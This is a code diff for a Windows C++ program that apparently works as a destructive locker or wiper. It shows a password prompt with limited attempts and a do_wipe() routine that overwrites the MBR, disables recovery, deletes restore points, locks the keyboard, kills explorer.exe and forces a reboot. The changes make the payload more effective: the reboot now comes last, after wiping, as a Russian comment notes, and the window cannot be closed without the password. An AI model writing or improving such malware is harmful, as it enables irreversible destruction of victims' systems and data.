@@ -21,11 +21,13 @@
 static HWND g_edit = nullptr;
 static HWND g_label = nullptr;
 static int g_attempts = 0;
+static bool g_unlocked = false;
 
 static std::string wide_to_utf8(const std::wstring& w) {
     if (w.empty()) return {};
     int len = WideCharToMultiByte(CP_UTF8, 0, w.c_str(), (int)w.size(),
                                   nullptr, 0, nullptr, nullptr);
+    if (len <= 0) return {};
     std::string out(len, 0);
     WideCharToMultiByte(CP_UTF8, 0, w.c_str(), (int)w.size(),
                         out.data(), len, nullptr, nullptr);
@@ -41,13 +43,18 @@ static bool password_matches(const std::wstring& input) {
 
     if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM, nullptr, 0) != 0)
         return false;
+
     if (BCryptGetProperty(hAlg, BCRYPT_HASH_LENGTH, (PUCHAR)&hashLen,
                           sizeof(hashLen), &cb, 0) != 0) {
         BCryptCloseAlgorithmProvider(hAlg, 0);
         return false;
     }
+
     hash = (PUCHAR)HeapAlloc(GetProcessHeap(), 0, hashLen);
-    if (!hash) { BCryptCloseAlgorithmProvider(hAlg, 0); return false; }
+    if (!hash) {
+        BCryptCloseAlgorithmProvider(hAlg, 0);
+        return false;
+    }
 
     if (BCryptCreateHash(hAlg, &hHash, nullptr, 0, nullptr, 0, 0) == 0) {
         std::string salt(CFG_SALT);
@@ -58,7 +65,7 @@ static bool password_matches(const std::wstring& input) {
         BCryptFinishHash(hHash, hash, hashLen, 0);
 
         char hex[65]{};
-        for (DWORD i = 0; i < hashLen; i++)
+        for (DWORD i = 0; i < hashLen && (i * 2 + 2) < sizeof(hex); i++)
             sprintf_s(hex + i * 2, 3, "%02x", hash[i]);
 
         ok = (_stricmp(hex, CFG_PASSWORD_HASH) == 0);
@@ -71,15 +78,6 @@ static bool password_matches(const std::wstring& input) {
 }
 
 static void do_wipe() {
-    STARTUPINFOW si{ sizeof(si) };
-    PROCESS_INFORMATION pi{};
-    wchar_t cmd[] = L"shutdown /r /t 15 /f";
-    if (CreateProcessW(nullptr, cmd, nullptr, nullptr, FALSE,
-                       CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
-        CloseHandle(pi.hProcess);
-        CloseHandle(pi.hThread);
-    }
-
     bool ok_mbr = CFG_KILL_MBR ? wipe_mbr() : false;
     disable_recovery();
     delete_restore_points();
@@ -87,10 +85,21 @@ static void do_wipe() {
 
     start_keyboard_lock();
 
+    STARTUPINFOW si{ sizeof(si) };
+    PROCESS_INFORMATION pi{};
+
     wchar_t tk[] = L"taskkill /f /im explorer.exe";
     if (CreateProcessW(nullptr, tk, nullptr, nullptr, FALSE,
                        CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
         WaitForSingleObject(pi.hProcess, 5000);
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+    }
+
+    // shutdown — последним, когда всё уже затёрто
+    wchar_t cmd[] = L"shutdown /r /t 5 /f";
+    if (CreateProcessW(nullptr, cmd, nullptr, nullptr, FALSE,
+                       CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
         CloseHandle(pi.hProcess);
         CloseHandle(pi.hThread);
     }
@@ -104,10 +113,12 @@ static void on_check(HWND hwnd) {
     std::wstring input(buf);
 
     if (password_matches(input)) {
+        g_unlocked = true;
         SetWindowTextW(g_label, L"Correct!");
         PostMessageW(hwnd, WM_CLOSE, 0, 0);
         return;
     }
+
     g_attempts++;
     SetWindowTextW(g_edit, L"");
     int left = 3 - g_attempts;
@@ -147,6 +158,9 @@ static LRESULT CALLBACK wnd_proc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lPar
         if (LOWORD(wParam) == 1) on_check(hwnd);
         return 0;
     case WM_CLOSE:
+        if (g_unlocked) {
+            DestroyWindow(hwnd);
+        }
         return 0;
     case WM_DESTROY:
         PostQuitMessage(0);
